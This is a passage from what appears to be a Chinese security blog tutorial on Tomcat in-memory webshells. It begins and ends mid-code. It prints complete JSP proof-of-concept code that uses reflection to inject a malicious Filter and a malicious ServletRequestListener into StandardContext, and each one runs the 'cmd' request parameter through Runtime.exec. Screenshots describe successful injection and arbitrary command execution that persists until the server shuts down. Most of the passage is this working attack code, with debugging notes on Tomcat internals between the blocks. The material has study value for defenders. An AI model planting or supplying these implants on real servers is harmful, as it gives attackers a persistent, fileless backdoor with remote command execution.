class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建恶意filter</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            String cmd;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                runtime.exec(cmd);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置基本的预定义的filtername</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;badFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterDef</span></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(evilFilter);</span><br><span class="line"></span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterMap</span></span><br><span class="line">    <span class="type">FilterMap</span>  <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterConfig所需的ApplicationFilterConfig</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">//放入filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterMaps</span> <span class="operator">=</span> (Map)configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    filterMaps.put(name,o);</span><br><span class="line"> <span class="comment">//加上提示</span></span><br><span class="line">    out.println(<span class="string">&quot;success inject&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>然后开启服务器，访问一下injection.jsp：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901142543173.png" alt="image-20240901142543173"></p>
<p>随后就可以任意命令执行了：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901142617267.png" alt="image-20240901142617267"></p>
<p>并且这个内存马是一直存在的，直到这个tomcat服务器关闭。</p>
<p>还有需要注意的就是tomcat7 与 tomcat8 在FilterDef和FilterMap这两个类所属的包名不一样：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;% <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h4><p>listener能够监听事件从而达成一些此熬过。在请求网站的时候，程序先执行listener监听器的内容： Listener -&gt; Filter -&gt; Servlet</p>
<p>LIstenerr 三个域对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ServletContextListener  <span class="comment">//服务器启动和终止时触发</span></span><br><span class="line">HttpSessionListener     <span class="comment">//有关session操作时触发</span></span><br><span class="line">ServletRequestListener  <span class="comment">//访问服务时触发</span></span><br></pre></td></tr></table></figure>

<p>毫无疑问，这里最好用的就是SerrvletRequestListener，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。</p>
<h5 id="基本Listener构造"><a href="#基本Listener构造" class="headerlink" title="基本Listener构造"></a>基本Listener构造</h5><p>要构造listener必须实现EventListener接口。这个接口的定义如下：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901153240871.png" alt="image-20240901153240871"></p>
<p>很多类都继承了这个接口。如果我们想要<strong>实现内存马就需要找一个每个请求都会被触发的Listener</strong>。</p>
<p>在这里需要用到的是ServletRequestListener接口，如下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901153656529.png" alt="image-20240901153656529"></p>
<p>这个接口中的方法用于监听ServletRequest对象的创建的销毁，从前面的学习中，我们很容易知道这里的ServletRequest就是请求的“对象”。</p>
<p>当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发<code>requestInitialized</code>方法。</p>
<p>简单测试一下：<br>Listener.java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>listener.Listener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动tomcat后，就会触发Listener的监听请求，访问任意的路径都会触发：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901154743206.png" alt="image-20240901154743206"></p>
<p>上面是在开启时进行的两次创建销毁，下面就是我随便输的访问路径执行的一次创建销毁。</p>
<h5 id="Listener流程分析"><a href="#Listener流程分析" class="headerlink" title="Listener流程分析"></a>Listener流程分析</h5><h6 id="应用运行前"><a href="#应用运行前" class="headerlink" title="应用运行前"></a>应用运行前</h6><p>这里需要了解一个知识点，<strong>tomcat在启动应用的时候，ContextConfig类会去读取配置文件</strong>。</p>
<p>所以我们直接去ContextConfig类里面去看一下，直接定位到一个方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901160041840.png" alt="image-20240901160041840"></p>
<p>可以看到这里读取了webxml。</p>
<p><strong>这个方法主要就是读取数据</strong>，简单看看其中的方法，读取了filter等组件：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901160547803.png" alt="image-20240901160547803"></p>
<p>调用了addFilterDef()方法来放入读取出来的filterDef。</p>
<p>————</p>
<p>在这里我们主要关注listener的读取，直接关键字搜索发现有如下方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901160722963.png" alt="image-20240901160722963"></p>
<p>打断点看一下这里的参数情况：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901160944447.png" alt="image-20240901160944447"></p>
<p>这里的context确实是StandardContext的实例，并且这里的webxml确实是有我们自定义的listener的：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901161645864.png" alt="image-20240901161645864"></p>
<p>正好对应了我们并没有在web.xml中定义filter，所以这是就是读取的我们自定义的web.xml中的数据。</p>
<p>————</p>
<p>上述就是读取配置文件，里面加载了Listener。在读取完配置文件后，中间还有一大部分过程略过，最后会调用StandardContext的listenerStart()方法，这个方法做了一些基础的安全检查，然后完成start业务。</p>
<h6 id="应用运行过程"><a href="#应用运行过程" class="headerlink" title="应用运行过程"></a>应用运行过程</h6><p>我们直接打断点自定义listener()方法的requestInitialized()方法，然后调试：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901164446842.png" alt="image-20240901164446842"></p>
<p>来看现在的调用栈：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901164522263.png" alt="image-20240901164522263"></p>
<p>定点于标重点部分，调用的fireRequestInitEvent()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901164825329.png" alt="image-20240901164825329"></p>
<p>这里就<strong>调用到了requestInitialized()方法</strong>。</p>
<p>在这个fireRequestInitEvent()方法最开始的地方调用了一个getApplicationEventListeners()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901170537558.png" alt="image-20240901170537558"></p>
<p>这个方法就是获取所有的Listener对象，打断点来看一下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901171655933.png" alt="image-20240901171655933"></p>
<p>获取到了我自定义的Listener类。</p>
<p><strong>如果有多个listener，代码在后面也是使用了for循环来分别初始化Listener</strong>。</p>
<p>并且在这个StandardContext中：</p>
<ul>
<li><p><strong>前面那个getApplicationEventListeners()方法其实可以算作是listener的”getter方法“，</strong></p>
</li>
<li><p>**并且StandardContext类还提供了“setter方法”，setApplicationEventListeners()**：</p>
</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901170941090.png" alt="image-20240901170941090"></p>
<p>所以我们可以尝试向StandardContext的变量applicationEventListenersList中添加一个恶意Listener。</p>
<h6 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h6><p><strong>先获取当前环境的StandardContext对象</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br></pre></td></tr></table></figure>



<p><strong>准备一个恶意Listener</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">badListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;销毁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest)sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(shell != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(shell);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>两个点说明一下：</p>
<ul>
<li>badListener 为什么是ServletRequestListener型</li>
</ul>
<p>还是从fireRequestInitEvent()方法说明：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901175538406.png" alt="image-20240901175538406"></p>
<p>已经很好理解了，instances即listener“合集”，这里if判断必须是ServletRequestListener型才能成功调用到listener中的requestInitialized()方法。</p>
<ul>
<li>listener中还实现了一次类型转换</li>
</ul>
<p>这是必要的，因为ServletRequest一般我们利用的request就是这个类型。在这里调用的ServletRequestEvent类的getServletRequest()方法如下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901192516778.png" alt="image-20240901192516778"></p>
<p>就是获取的ServletRequest类型的request。</p>
<p><strong>注入恶意代码</strong>：</p>
<p>这里就是利用前面说过的setApplicationEventListeners()方法，需要注意的是这个方法接收一个Object数组：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901193828863.png" alt="image-20240901193828863"></p>
<p>所以需要将badListener设置为数组形式直接将前面设计好的listener加进去即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取StandardContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"><span class="comment">//编写恶意listener</span></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">badListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;销毁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest)sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(shell != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(shell);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//注入恶意代码</span></span><br><span class="line">    standardContext.setApplicationEventListeners(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;badListener&#125;);</span><br></pre></td></tr></table></figure>

<p>还有的就是我看其他师傅的文章，<strong>注入恶意listener时好像都是用的addApplicatioinEventListener()方法</strong>，如下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901200742920.png" alt="image-20240901200742920"></p>
<p>只是我这里用的setApplicationEventListeners()：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901200833218.png" alt="image-20240901200833218"></p>
<h6 id="最终POC-1"><a href="#最终POC-1" class="headerlink" title="最终POC"></a>最终POC</h6><p>加入到jsp中就是：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取StandardContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"><span class="comment">//编写恶意listener</span></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">badListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;销毁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest)sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(shell != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(shell);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//注入恶意代码</span></span><br><span class="line">    standardContext.setApplicationEventListeners(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;badListener&#125;);</span><br><span class="line"><span class="comment">//提示</span></span><br><span class="line">    out.println(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问injection.jsp：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901194707829.png" alt="image-20240901194707829"></p>
<p>成功注入，再随便请求资源加上参数：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901194757468.png" alt="image-20240901194757468"></p>
<p>成功命令执行。</p>
<p>——————</p>
<p>如果用addApplicationEventListener()方法的话就是如下：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取StandardContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span 